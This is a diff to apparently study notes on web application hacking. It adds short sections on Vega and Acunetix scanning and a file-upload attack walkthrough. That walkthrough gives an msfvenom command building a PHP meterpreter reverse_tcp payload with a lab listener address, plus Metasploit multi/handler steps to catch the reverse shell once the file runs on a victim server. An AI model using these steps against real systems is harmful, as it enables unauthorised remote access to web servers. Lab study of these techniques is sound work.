@@ -326,4 +326,32 @@ msf auxiliary(wordpress_login_enum) > exploit
 
 ```
 - To launch Remote Desktop Connection, navigate to ```Start--> Windows Accessories--> Remote Desktop Connection```
+
+### 5)Web Appn Framework
+<details>
+<summary> Auditing </summary>
+
+#### Tools: Vega(Linux)
+- Enter URL --> select Injection and Response modules --> click yes --> check Scan summary
 </details>
+
+### x) WVS 
+#### Tool: Acunetics WVS
+
+### y) File Upload Vulnerbility
+-  ``` msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw ```  
+- This command will generate a php raw payload.
+- copy the payload and make a .php file
+-  ```msfconsole``` . Now you have to establish a meterpreter session with your victim
+```
+Type use multi/handler and hit Enter.
+Type set payload
+php/meterpreter/reverse_tcp and hit
+Enter.
+Type set lhost 10.10.10.11 and hit Enter.
+set Iport 4444
+and hit Enter.
+- vist the uri where the file is to execute on web browser
+```
+</details>
+
